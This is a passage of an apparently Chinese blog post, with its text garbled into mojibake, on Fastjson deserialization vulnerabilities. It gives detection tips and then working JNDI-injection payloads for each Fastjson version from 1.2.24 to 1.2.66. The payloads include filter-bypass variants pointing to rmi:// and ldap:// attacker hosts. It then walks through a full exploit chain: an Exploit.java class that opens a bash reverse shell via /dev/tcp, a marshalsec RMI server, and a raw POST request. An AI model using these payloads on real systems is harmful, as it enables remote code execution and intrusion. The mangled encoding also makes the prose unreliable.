title="2.é»‘ç›’æµ‹è¯•"></a>2.é»‘ç›’æµ‹è¯•</h2><p>Fastjsonæ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€æ¬¾JSONè§£æåº“ï¼Œå¯ç”¨äºå°†Javaå¯¹è±¡è½¬æ¢ä¸ºå…¶JSONè¡¨ç¤ºå½¢å¼ï¼Œä¹Ÿå¯ä»¥ç”¨äºå°†JSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºç­‰æ•ˆçš„Javaå¯¹è±¡ã€‚</p><p>å®ƒé‡‡ç”¨ä¸€ç§â€œå‡å®šæœ‰åºå¿«é€ŸåŒ¹é…â€çš„ç®—æ³•ï¼ŒæŠŠJSON Parseçš„æ€§èƒ½æå‡åˆ°æè‡´ï¼Œæ˜¯ç›®å‰Javaè¯­è¨€ä¸­æœ€å¿«çš„JSONåº“ã€‚Fastjsonæ¥å£ç®€å•æ˜“ç”¨ï¼Œå·²ç»è¢«å¹¿æ³›ä½¿ç”¨åœ¨ç¼“å­˜åºåˆ—åŒ–ã€åè®®äº¤äº’ã€Webè¾“å‡ºã€Androidå®¢æˆ·ç«¯ç­‰å¤šç§åº”ç”¨åœºæ™¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ç›®æ ‡ç«™ç‚¹å¦‚æœæŠ¥é”™çš„è¯ä¸€èˆ¬ä½¿ç”¨ä¸é—­åˆ&#123;èŠ±æ‹¬å·æˆ–è€…å¤šæ·»åŠ <span class="string">&quot;åŒå¼•å·æ¥è¿›è¡Œæµ‹è¯•&quot;</span>  <span class="comment"># &#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>fastjsonä¸jacksonåŒºåˆ«ï¼Œå¦‚æœè¯·æ±‚åŒ…ä¸­çš„ json å¦‚ä¸‹:</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">21</span>&#125;</span><br><span class="line">è¿½åŠ ä¸€ä¸ªéšæœº key ,ä¿®æ”¹ json ä¸º</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">21</span>,<span class="string">&quot;agsbdkjada__ss_d&quot;</span>:<span class="number">123</span>&#125;</span><br><span class="line">è¿™é‡Œ fastjson æ˜¯ä¸ä¼šæŠ¥é”™çš„, Jackson å› ä¸ºå¼ºåˆ¶ key ä¸ javabean å±æ€§å¯¹é½,åªèƒ½ å°‘ä¸èƒ½å¤š key,</span><br><span class="line">æ‰€ä»¥ä¼šæŠ¥é”™,æœåŠ¡å™¨çš„å“åº”åŒ…ä¸­å¤šå°‘ä¼šæœ‰å¼‚å¸¸å›æ˜¾</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>dosæ£€æµ‹ dos</span><br><span class="line">&#123;<span class="string">&quot;a:&quot;</span>\x çœ‹è¿”å›æ—¶é—´</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>å¦‚æœæ˜¯jsonå­—ç¬¦ä¸²ä¸­nameå­—æ®µå­˜åœ¨ååºåˆ—åŒ–</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;wangwei&quot;</span>&#125;é‚£ä¹ˆpocå°±æ˜¯</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://fatjaon.tuq75v.ceye.io&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:true&#125;&#125;</span><br><span class="line"></span><br><span class="line">å°tips</span><br><span class="line"><span class="number">1.</span>åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°åªè¦å›æ˜¾æ¯”è¾ƒæ…¢ï¼Œæˆ–è€…æ„Ÿè§‰å¡é¡¿éƒ½æœ‰å¯èƒ½æ˜¯æ­£åœ¨æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥æ¯”è¾ƒæ…¢</span><br><span class="line"><span class="number">2.</span>poc.javaæ–‡ä»¶ç”¨ä½ç‰ˆæœ¬çš„javaç¯å¢ƒç¼–è¯‘ï¼Œå› ä¸ºjavaæ˜¯å‘ä¸‹å…¼å®¹çš„ï¼Œé˜²æ­¢ç›®æ ‡ç¯å¢ƒåŠ è½½çš„æ—¶å€™è¿è¡ŒæŠ¥é”™ï¼Œæœ€å¥½æ˜¯jdk1<span class="number">.6</span></span><br></pre></td></tr></table></figure><h1 id="0x02-fastjson-ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#0x02-fastjson-ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="0x02 fastjson ååºåˆ—åŒ–æ¼æ´åŸç†"></a>0x02 fastjson ååºåˆ—åŒ–æ¼æ´åŸç†</h1><p><img src="/2022/498480683/image.png" alt="img"> </p><h2 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h2><p><strong>@type</strong></p><blockquote><p>æŒ‡å®šçš„è§£æç±»ï¼Œå³<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ï¼ŒFastjsonæ ¹æ®æŒ‡å®šç±»å»ååºåˆ—åŒ–å¾—åˆ°è¯¥ç±»çš„å®ä¾‹ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹åªä¼šå»ååºåˆ—åŒ–publicä¿®é¥°çš„å±æ€§ï¼Œåœ¨pocä¸­ï¼Œ<code>_bytecodes</code>ä¸<code>_name</code>éƒ½æ˜¯ç§æœ‰å±æ€§ï¼Œæ‰€ä»¥è¦æƒ³ååºåˆ—åŒ–è¿™ä¸¤ä¸ªï¼Œéœ€è¦åœ¨<code>parseObject()</code>æ—¶è®¾ç½®<code>Feature.SupportNonPublicField</code></p></blockquote><h2 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h2><p>å› ä¸ºä¸è®©å±æ€§ï¼Œæ‰¾é”™ç±»å‹<code>@type</code>  å¼•å…¥äº†<code>autotype</code> ï¼Œ<code>com.sun.rowset.JdbcRowSetImpl </code>ä¸€å®šä¼šè¢«è¯»å–åŠ è½½</p><p><code>com.sun.rowset.JdbcRowSetImpl</code>æ˜¯ä¸ªæ¶æ„ç±»ï¼Œé»˜è®¤å¯¹å±æ€§ä¸åšä»»ä½•å¤„ç†ï¼Œå¯¼è‡´äº†ååºåˆ—åŒ–ï¼Œå¯ä»¥ä»»æ„æ‰§è¡Œå‘½ä»¤</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exp 1.2.24</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h2><p>æ—¢1.2.25ç‰ˆæœ¬ä¹‹åè®¾ç½®äº†<code>autoTypeSupport</code>å±æ€§é»˜è®¤ä¸º<code>false</code>ï¼Œå¹¶ä¸”å¢åŠ äº†<code>checkAutoType()</code>å‡½æ•°ï¼Œä¿®å¤æ˜¯ç”¨äº†ç™½åå•ï¼Œåé¢æ˜¯é€šè¿‡ç»•è¿‡ç™½åå•æ¥è¿›è¡Œæ”»å‡»çš„<code>com.sun.rowset.JdbcRowSetImpl</code>åœ¨1.2.25ç‰ˆæœ¬è¢«åŠ å…¥äº†é»‘åå•ï¼Œfastjsonæœ‰ä¸ªåˆ¤æ–­æ¡ä»¶åˆ¤æ–­ç±»åæ˜¯å¦ä»¥â€<code>L</code>â€å¼€å¤´ã€ä»¥â€<code>;</code>â€ç»“å°¾ï¼Œæ˜¯çš„è¯å°±æå–å‡ºå…¶ä¸­çš„ç±»åå†åŠ è½½è¿›æ¥ï¼Œå› æ­¤åœ¨åŸç±»åå¤´éƒ¨åŠ <code>L</code>ï¼Œå°¾éƒ¨åŠ <code>;</code>å³å¯ç»•è¿‡é»‘åå•çš„åŒæ—¶åŠ è½½ç±»ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>autoTypeSupport</code>å±æ€§ä¸º<code>true</code>æ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h2><p>å¦‚æœè¾“å…¥ç±»åçš„å¼€å¤´å’Œç»“å°¾æ˜¯<code>L</code>å’Œ<code>;</code>å°±å°†å¤´å’Œå°¾å»æ‰ï¼Œå†è¿›è¡Œé»‘åå•éªŒè¯ã€‚ è¿˜æŠŠé»‘åå•çš„å†…å®¹è¿›è¡Œäº†åŠ å¯†ï¼Œé»‘åå•åŒ…ç±»ï¼š<a href="https://github.com/LeadroyaL/fastjson-blacklist%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%8C%E5%9C%A8%E7%B1%BB%E5%90%8D%E5%A4%96%E9%83%A8%E5%B5%8C%E5%A5%972%E5%B1%82L;%E3%80%82">https://github.com/LeadroyaL/fastjson-blacklist </a>ç»•è¿‡æ–¹æ³•ï¼Œåœ¨ç±»åå¤–éƒ¨åµŒå¥—2å±‚<code>L;</code>åŸç±»åï¼š<code>com.sun.rowset.JdbcRowSetImpl</code> ç»•è¿‡ï¼š<code> LLcom.sun.rowset.JdbcRowSetImpl;;</code></p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h2><p>fastjsonåœ¨1.2.43ä¸­<code>checkAutoType()</code>å‡½æ•°å¢åŠ åˆ¤æ–­å¼€å¤´ä¸º<code>LL</code>ç›´æ¥æŠ¥é”™ã€‚ ç»•è¿‡æ–¹æ³•: æ ¹æ®fastjsonåˆ¤æ–­å‡½æ•°ï¼Œ<code>[</code>å¼€å¤´åˆ™æå–ç±»åï¼Œä¸”åé¢å­—ç¬¦å­—ç¬¦ä¸ºâ€<code>[</code>â€œã€â€<code>&#123;</code>â€œç­‰ï¼Œå³å¯æ­£å¸¸è°ƒç”¨</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h2><p>å‰ææ¡ä»¶ï¼šéœ€è¦ç›®æ ‡æœåŠ¡ç«¯å­˜åœ¨<code>mybatis</code>çš„jaråŒ…ï¼Œä¸”ç‰ˆæœ¬éœ€ä¸º<code>3.x.x</code>ç³»åˆ—<code>&lt;3.5.0</code>çš„ç‰ˆæœ¬ã€‚ ä½¿ç”¨é»‘åå•ç»•è¿‡ï¼Œ<code>org.apache.ibatis.datasource</code>åœ¨<code>1.2.46</code>ç‰ˆæœ¬è¢«åŠ å…¥äº†é»‘åå• ç”±äºåœ¨é¡¹ç›®ä¸­ä½¿ç”¨çš„é¢‘ç‡ä¹Ÿè¾ƒé«˜ï¼Œæ‰€ä»¥å½±å“èŒƒå›´è¾ƒå¤§ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h2><p>å¯¹ç‰ˆæœ¬å°äº1.2.48çš„ç‰ˆæœ¬é€šæ€ï¼Œ<code>autoType</code>ä¸ºå…³é—­çŠ¶æ€ä¹Ÿå¯ä½¿ç”¨ã€‚ <code>loadClass</code>ä¸­é»˜è®¤<code>cache</code>è®¾ç½®ä¸º<code>true</code>ï¼Œ</p><p>(1)é¦–å…ˆä½¿ç”¨<code>java.lang.Class</code>æŠŠè·å–åˆ°çš„ç±»ç¼“å­˜åˆ°<code>mapping</code>ä¸­ï¼Œ</p><p>(2)ç›´æ¥ä»ç¼“å­˜ä¸­è·å–åˆ°äº†<code>com.sun.rowset.JdbcRowSetImpl</code>è¿™ä¸ªç±»ï¼Œç»•è¿‡äº†é»‘åå•æœºåˆ¶ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h2><p>åŸºäºé»‘åå•ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,</span><br><span class="line">  <span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span></span><br><span class="line">&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><h2 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h2><p>å…³äºfastjson&lt;=1.2.66ç½‘ä¸Šç›¸å…³çš„åˆ©ç”¨ä¸å¤š,æ”¶é›†åˆ°çš„å‡ ä¸ªexpï¼Œä¹Ÿæ˜¯åŸºäºé»‘åå•ç»•è¿‡ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line">  <span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247486298&amp;idx=1&amp;sn=6c0377e574db63eab2423187240d799c&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247486298&amp;idx=1&amp;sn=6c0377e574db63eab2423187240d799c&amp;scene=21#wechat_redirect</a></p><p><a href="https://www.bilibili.com/video/BV1Ab4y1d7w1?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click">https://www.bilibili.com/video/BV1Ab4y1d7w1?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click</a></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><h1 id="0x03-Fastjson-æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#0x03-Fastjson-æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x03 Fastjson æ¼æ´åˆ©ç”¨æ–¹å¼"></a>0x03 Fastjson æ¼æ´åˆ©ç”¨æ–¹å¼</h1><p>ç¼–å†™EXP-&gt;å¯åŠ¨pythonæœåŠ¡å™¨-&gt;å¯åŠ¨rmi ç›‘å¬-&gt; å‘é€poc-&gt;æˆåŠŸåå¼¹shell</p><p>éœ€è¦ Java ç¯å¢ƒ</p><h3 id="ç¼–è¯‘EXP"><a href="#ç¼–è¯‘EXP" class="headerlink" title="ç¼–è¯‘EXP"></a>ç¼–è¯‘EXP</h3><p>å°†ä»£ç ç¼–å†™ä¸ºclassç±»æ–‡ä»¶ï¼Œå¹¶å°†ç”Ÿæˆçš„ç±»æ–‡ä»¶æ”¾åœ¨webç›®å½•ä¸‹ï¼Œå¹¶å¯åŠ¨webæœåŠ¡</p><p><a href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p><p>EXPç¼–ç  <code>bash -c &#123;echo,YmFzaCAtaSA+JiAgL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;</span>&#125;);<span class="comment">//éœ€è¦è¿›è¡Œ base64 ç¼–ç </span></span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ EXP å¹¶å¯åŠ¨ python æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç¼–è¯‘</span></span><br><span class="line">javac Exploit.java</span><br><span class="line"><span class="comment"># python æœåŠ¡</span></span><br><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure><h3 id="é…ç½®RMIç¯å¢ƒ"><a href="#é…ç½®RMIç¯å¢ƒ" class="headerlink" title="é…ç½®RMIç¯å¢ƒ"></a>é…ç½®RMIç¯å¢ƒ</h3><p>ç”¨marshalsecé¡¹ç›®ï¼Œå¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶åŠ è½½è¿œç¨‹ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/mbechler/marshalsec.git</span></span><br><span class="line">cd marshalsec/</span><br><span class="line">mvn install</span><br><span class="line">mvn clean <span class="keyword">package</span> â€“DskipTests</span><br><span class="line">cd target/</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨RMIæœåŠ¡ç›‘å¬"><a href="#å¯åŠ¨RMIæœåŠ¡ç›‘å¬" class="headerlink" title="å¯åŠ¨RMIæœåŠ¡ç›‘å¬"></a>å¯åŠ¨RMIæœåŠ¡ç›‘å¬</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://1.1.1.1:8888/#Exploit&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p>å¤‡æ³¨ï¼š<a href="http://xx.xx.xx.xx:9999/#POC">http://xx.xx.xx.xx:9999/#POC</a> æ˜¯æ”¾Javaç±»çš„åœ°å€ï¼Œç±»åªè¦å†™åå­—å³å¯ï¼Œä¸éœ€è¦åŠ .classï¼Œå…¶æ¬¡ç±»åå‰è¦åŠ #</p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>æŠŠç½‘ç«™jsonæ•°æ®åŒ…æ›¿æ¢ï¼Œç„¶åå‘åŒ…ï¼ŒVPSå³å¯æ”¶åˆ°</p><p>è¿™é‡Œçš„EXP æ ¹æ®Fastjson ç‰ˆæœ¬ä¸åŒï¼Œè¿›è¡Œæ›¿æ¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    &quot;a&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span></span><br><span class="line"><span class="comment">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    &quot;b&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span 